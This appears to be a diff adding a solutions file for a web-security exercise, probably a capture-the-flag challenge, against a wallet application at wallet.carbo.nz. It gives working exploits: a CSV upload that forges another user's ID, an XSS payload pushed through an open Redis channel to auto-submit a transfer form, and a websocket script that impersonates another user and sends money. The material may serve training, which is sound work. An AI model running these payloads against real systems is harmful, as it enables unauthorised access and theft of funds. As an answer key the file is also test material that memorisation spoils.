@@ -1,0 +1,37 @@
+solutions for the web part:
+
+// issue 1
+upload CSV with "user_id" set as well to another user, and "to_user_id" set to yourself
+
+
+
+// issue 2 - XSS
+redis-cli -h wallet.carbo.nz -p 9999
+
+PUBLISH webapp:messages "<script>f=$('form').first();f.find('input')[2].value='2';f.find('input')[3].value='2';f.submit()</script>"
+
+
+
+// issue 3 - hidden websockets functionality (need to inspect client side JavaScript to find it - and/or portscan the box)
+
+$.post("https://wallet.carbo.nz:4000/login", {
+  token: zzzzzzzzzzzz
+}).done(function(result) {
+  return back(result.token);
+});
+
+var back = function(tok) {
+   var socket;
+   socket = io.connect("https://wallet.carbo.nz:4000", {
+     query: "token=" + tok
+   });
+   return socket.on("connect", function() {
+     socket.emit("message", JSON.stringify({"user_id":"4"})); // override your user ID to someone else
+     setTimeout(function(){
+       socket.emit("message", JSON.stringify({"to_id":"1","amount":40}));
+     }, 2000);
+   }).on("disconnect", function() {
+   }).on("notification", function(notif) {
+     console.log(notif);
+   });
+ };
